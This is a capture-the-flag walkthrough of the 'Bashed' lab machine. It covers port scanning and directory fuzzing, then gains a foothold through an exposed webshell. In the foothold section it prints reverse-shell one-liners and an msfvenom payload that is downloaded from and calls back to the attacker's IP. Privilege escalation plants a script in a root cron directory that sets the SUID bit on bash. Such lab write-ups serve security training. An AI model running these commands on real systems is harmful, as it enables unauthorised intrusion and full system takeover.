Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted, the privilege escalation is based on deductions about timestamps.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.10.68 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn -v
```

![](/assets/Bashed/1.png)
<br />
<br />
<br />

There is **1 open port**:
+ **80/tcp**

<br />
Let's check which **service** is running in this port:

```bash
sudo nmap -sS 10.10.10.68 -p 80 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A -v
```

![](/assets/Bashed/2.png)
<br />
<br />
<br />

We can see that the service corresponds to:
+ **80/tcp Apache 8.2p1**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.68 -p 80 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn -v
```

<br />
<br />
<br />

We can see a few **folders**, but nothing really interesting.

<br />

------

<br />
### Foothold

This machine runs a **[GitHub project](https://github.com/Arrexel/phpbash)** which works as a **webshell**, the main difficulty of the foothold was **finding were the webshell is located** and **evading security measures** for reverse shells.

<br />

When entering the website, this is the first thing we can see:

![](/assets/Bashed/4.png)
<br />
<br />
<br />

A quick search in google revealed the project used in this website:

![](/assets/Bashed/5.png)
<br />
<br />
<br />

This project comprehends a semi-interactive webshell, which we can use to gain access to the machine. However, we first need to find where is this webshell located, we can use gobuster for this:

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,bak,php.bak,html -o gobuster_dir_and_file_enum_80.txt -t 25 -r
```

![](/assets/Bashed/6.png)
<br />
<br />
<br />

After checking in each folder, finally I found the webshell in ***/dev/phpbash.php***:

![](/assets/Bashed/7.png)
<br />
<br />
<br />

I tried to gain a reverse shell with commands like `bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'` or `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.9 4444 >/tmp/f`, so I tried to **create a malicious file** and send it to the target machine:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 --platform linux -f elf -o revshell.elf
sudo python3 -m http.server 80
```
<br />

Now, from the webshell, we can download it, however, we have to **download it from */tmp***, as we have no write permissions:

```bash
cd $(mktemp -d)
wget http://10.10.16.9/revshell.elf
```

![](/assets/Bashed/8.png)
<br />
<br />
<br />

Now we just have to **setup a listener in our machine and execute the file**, but first we have to give the file **execution privileges**:

```bash
rlwrap nc -nlvp 4444
```

```bash
chmod 777 revshell.elf
./revshell.elf
```

![](/assets/Bashed/9.png)
<br />
<br />
<br />

And just like this we got the foothold on the machine:

![](/assets/Bashed/10.png)
<br />
<br />
<br />

We can **grab the flag**, located in the directory of the **user *arrexel***:

![](/assets/Bashed/11.png)
<br />
<br />
<br />

------

<br />
### Privilege Escalation

For this privilege escalation, we first have to **pivot to another user and then to root**.

<br />

Enumerating www-data privileges, I discovered that it can **run any command without password as the user *scriptmanager***:

```bash
sudo -l
```

![](/assets/Bashed/12.png)
<br />
<br />
<br />

With this information we can pivot right away to this user:

```bash
sudo -u scriptmanager bash -i
```

![](/assets/Bashed/13.png)
<br />
<br />
<br />

Enumerating scriptmanager's files, I discovered a directory named /scripts:
```bash
find / -user $(whoami) -ls 2>/dev/null | grep -v -e "/proc/*" -e "/sys/*" -e "/run/*"
```

![](/assets/Bashed/14.png)
<br />
<br />
<br />

In this directory we can see **two files**, one owned by root and the other by scriptmanager, the **file owned by scriptmanager writes its contents to the file owned by root**, however it is **not specified in any place that it changes the ownership**, which means that **root is executing this script**.

![](/assets/Bashed/15.png)
<br />
<br />
<br />

We could confirm this by running the [PsPy](https://github.com/DominicBreuker/pspy?tab=readme-ov-file) tool, which indicates that a **CRON job** is running, which executes **every file ending in with a *.py* extension that is located in the */scripts* directory**:

![](/assets/Bashed/16.png)
<br />
<br />
<br />

Knowing this, we just have to **create a python file that set the SUID bit to the bash binary**:

```bash
echo "import os; os.system('chmod u+s /bin/bash')" > privesc.py
```

<br />

We can confirm that the script have been executed and escalate privileges:

```bash
bash -p
```

![](/assets/Bashed/17.png)
<br />
<br />
<br />

Finally, we can get our well-deserved **root flag**:
